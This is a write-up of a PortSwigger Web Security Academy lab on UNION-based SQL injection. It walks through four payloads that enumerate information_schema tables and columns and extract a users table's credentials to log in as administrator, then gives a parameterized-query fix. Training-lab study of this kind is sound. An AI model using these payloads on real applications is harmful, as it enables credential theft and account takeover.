\# SQL Injection — Listing Database Contents (Non-Oracle)



Platform: PortSwigger Web Security Academy

Difficulty: Practitioner

Date: January 17, 2026

Status: Solved



\---



**## Objective**



Extract usernames and passwords from the 

database and log in as `administrator`.



\---



\## What I Found



The category filter was vulnerable to 

UNION-based SQL injection. Since this was 

a non-Oracle database (PostgreSQL), I could 

use `information\_schema` to find table and 

column names without needing `DUAL`.



\---



**## What I Did**



**\*\*Step 1 — Checked column count and type:\*\***



```sql

'+UNION+SELECT+'abc','def'--

```

No error — confirmed 2 string columns.



**\*\*Step 2 — Found the table name:\*\***



```sql

'+UNION+SELECT+table\_name,NULL+FROM+

information\_schema.tables--

```

Found table: `users\_abcdef`



**\*\*Step 3 — Found the column names:\*\***



```sql

'+UNION+SELECT+column\_name,NULL+FROM+

information\_schema.columns+WHERE+

table\_name='users\_abcdef'--

```

Found columns: `username\_bcdefg` 

and `password\_cdefgh`



**\*\*Step 4 — Extracted credentials:\*\***



```sql

'+UNION+SELECT+username\_bcdefg,

password\_cdefgh+FROM+users\_abcdef--

```

Got all usernames and passwords 

from the database.



Logged in as `administrator` 

using extracted credentials. 



\---



\## Why It Worked



`information\_schema` is a built-in 

metadata store available in PostgreSQL, 

MySQL, and SQL Server. It lists all 

tables and columns in the database.

Since I could inject into the UNION, 

I used it to ask the database to 

reveal its own structure — then 

pulled the data directly.



\---



\## Impact



\- Full credential table exposed

\- Admin account completely compromised





\---



\## Fix



Use parameterized queries:



```python

cursor.execute("SELECT \* FROM products 

WHERE category = ?", (category,))

```



Also restrict database user permissions 

so `information\_schema` is not accessible 

from the application account.



\---



\## Reference



\[PortSwigger SQLi UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

